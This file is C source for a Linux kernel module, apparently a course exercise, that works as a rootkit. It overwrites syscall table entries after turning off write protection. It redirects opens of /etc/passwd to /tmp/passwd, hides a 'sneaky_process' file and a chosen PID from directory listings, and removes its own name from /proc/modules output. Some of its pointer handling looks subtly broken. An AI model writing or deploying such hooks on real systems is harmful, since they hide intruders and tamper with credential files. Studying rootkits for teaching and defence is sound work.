#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/fs.h>           // for file operations
#include <linux/slab.h>         // for kmalloc and kfree
#include <linux/uaccess.h>      // for copy_to_user and copy_from_user
#include <linux/file.h>
#include <linux/dirent.h>

#include <linux/ctype.h> // Include this at the top of your file
bool is_number(const char *str) {
  while (*str) {
    if (!isdigit(*str))
      return false;
    str++;
  }
  return true;
}

static char *sneaky_pid = "";

module_param(sneaky_pid, charp, 0000); // Declare a module parameter to accept the PID
MODULE_PARM_DESC(sneaky_pid, "Process ID of the sneaky_process");

#define PREFIX "sneaky_process"

// =========#2
// struct linux_dirent64 {
//   u64 d_ino;
//   s64 d_off;
//   unsigned short d_reclen;
//   unsigned char d_type;
//   char d_name[];
// };
struct linux_dirent {
  long d_ino;
  off_t d_off;
  unsigned short d_reclen;
  char d_name[];
};

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// ===========Define your new sneaky version of the 'openat' syscall===========================
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  // Cast the filename pointer from the registers
  char __user *filename = (char __user *)regs->di;

  // Buffer to store the filename
  char fname[256];

  // Copy the filename from userspace to kernel space
  strncpy_from_user(fname, filename, sizeof(fname));

  // Check if the file being opened is /etc/passwd
  if (strcmp(fname, "/etc/passwd") == 0) {
    // Redirect the openat call to /tmp/passwd
    copy_to_user(filename, "/tmp/passwd", sizeof("/tmp/passwd"));
  }
  return (*original_openat)(regs);
}

// ===========To hide the "sneaky_process" executable file from the ls and find commands========
// Save the original getdents64 system call function pointer:
asmlinkage int (*original_getdents64)(struct pt_regs *regs);

asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
  //printk(KERN_INFO "Sneaky getdents is called.\n");
  struct linux_dirent64* d;
  int nread, bpos;
  nread = original_getdents64(regs);
  for(bpos=0; bpos < nread;){
    d = (struct linux_dirent64 *)((char *)regs->si + bpos);
    if (strcmp(d->d_name, "sneaky_process") == 0 || (is_number(d->d_name) && strcmp(d->d_name, sneaky_pid) == 0)){
      int current_size = d->d_reclen;
      int rest = ((char*)regs->si+nread) - ((char*)d+current_size);
      void* source = (char*)d + current_size;
      memmove(d,source,rest);
      nread -= current_size;
    }
    bpos += d->d_reclen;
  }
  return nread;
}

// =========To hide the sneaky_module from the list of active kernel modules
// declare a pointer to the original read system call
asmlinkage ssize_t (*original_read)(struct pt_regs *regs);
// create a sneaky_read function to intercept the read system call
asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
  int fd = (int)regs->di;
  void *buf = (void *)regs->si;
  size_t count = (size_t)regs->dx;

  struct file *f;
  ssize_t nread;

  nread = original_read(regs);

  f = fget(fd);
  if (f) {
    if (nread > 0 && strcmp(f->f_path.dentry->d_iname, "modules") == 0) {
      void *st = strnstr(buf, "sneaky_mod", nread);
      if (st != NULL) {
        void *ed = strnstr(st, "\n", nread - (st - buf));
        if (ed != NULL) {
          int len = ed - st + 1;
          memmove(st, ed + 1, nread - (st - buf) - len);
          nread -= len;
        }
      }
    }
    fput(f);
  }

  return nread;
}


// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // openat
  original_openat = (void *)sys_call_table[__NR_openat];
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;

  // getdents64
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;

  // // // read
  original_read = (void *)sys_call_table[__NR_read];
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0; // to show a successful load
}



static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

 
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);
}


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");